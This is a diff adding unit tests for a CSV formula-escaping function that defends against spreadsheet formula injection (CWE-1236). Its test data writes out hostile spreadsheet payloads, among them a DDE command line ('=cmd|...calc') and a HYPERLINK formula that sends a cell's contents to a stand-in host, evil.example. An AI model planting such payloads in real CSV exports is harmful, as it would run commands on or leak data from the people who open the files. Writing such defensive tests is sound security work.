@@ -1,5 +1,10 @@
 import { afterEach, describe, expect, it, vi } from 'vitest';
-import { assertionFromString, serializeObjectArrayAsCSV, testCaseFromCsvRow } from '../src/csv';
+import {
+  assertionFromString,
+  escapeCsvFormula,
+  serializeObjectArrayAsCSV,
+  testCaseFromCsvRow,
+} from '../src/csv';
 import logger from '../src/logger';
 
 vi.mock('../src/logger', () => ({
@@ -780,5 +785,82 @@ describe('serializeObjectArrayAsCSV', () => {
     // Note: The actual implementation includes quotes around values and a trailing newline
     const expected = 'name,age\n"John","30"\n"Jane","25","NY"\n';
     expect(serializeObjectArrayAsCSV(vars)).toBe(expected);
+  });
+});
+
+describe('escapeCsvFormula', () => {
+  it.each([
+    ['=1+1', "'=1+1"],
+    ["=cmd|'/c calc'!A1", "'=cmd|'/c calc'!A1"],
+    ['@SUM(A1:A9)', "'@SUM(A1:A9)"],
+    ['+1+1', "'+1+1"],
+    ['-1+1', "'-1+1"],
+    ['-2+cmd', "'-2+cmd"],
+  ])('prefixes formula trigger %p -> %p', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+
+  it.each([
+    ['\t=danger', "'\t=danger"],
+    ['\r=danger', "'\r=danger"],
+    ['  =danger', "'  =danger"],
+    ['\t@SUM(A1)', "'\t@SUM(A1)"],
+    ['\r-1+1', "'\r-1+1"],
+    ['\n\t =evil', "'\n\t =evil"],
+  ])('treats leading whitespace/control before a trigger as a formula (%p)', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+
+  it.each([
+    // Zero-width chars are invisible to JS \s but stripped by spreadsheets before
+    // parsing, so a leading one must not hide a formula trigger (CWE-1236 bypass).
+    ['\u200B=1+1', "'\u200B=1+1"], // zero-width space
+    ['\u200C@SUM(A1)', "'\u200C@SUM(A1)"], // zero-width non-joiner
+    ['\u200D=cmd', "'\u200D=cmd"], // zero-width joiner
+  ])('escapes triggers hidden behind zero-width characters (%p)', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+
+  it.each([
+    // Number() treats these as valid numbers, but they are not finite numerals and
+    // must still be escaped so the -/+ numeric carve-out cannot be abused.
+    ['-Infinity', "'-Infinity"],
+    ['+Infinity', "'+Infinity"],
+    ['-1e400', "'-1e400"], // overflows to -Infinity
+  ])('escapes non-finite numeric-looking values (%p)', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+
+  it.each([
+    // Real-world payloads, to make the protection legible to reviewers.
+    [
+      '=HYPERLINK("https://evil.example?x="&A1,"click")',
+      '\'=HYPERLINK("https://evil.example?x="&A1,"click")',
+    ],
+    ["=cmd|'/c calc'!A1", "'=cmd|'/c calc'!A1"],
+  ])('neutralizes real exfiltration/command payloads (%p)', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+
+  it.each([
+    ['-5', '-5'],
+    ['-5.25', '-5.25'],
+    ['-1e3', '-1e3'],
+    ['+5', '+5'],
+    ['+3.14', '+3.14'],
+  ])('leaves legitimate numbers untouched (%p)', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+
+  it.each([
+    ['hello world', 'hello world'],
+    ['5-3', '5-3'],
+    ['a=b', 'a=b'],
+    ['user@example.com', 'user@example.com'],
+    ['', ''],
+    ['   ', '   '],
+    ['\t\t', '\t\t'],
+  ])('leaves non-formula values untouched (%p)', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
   });
 });
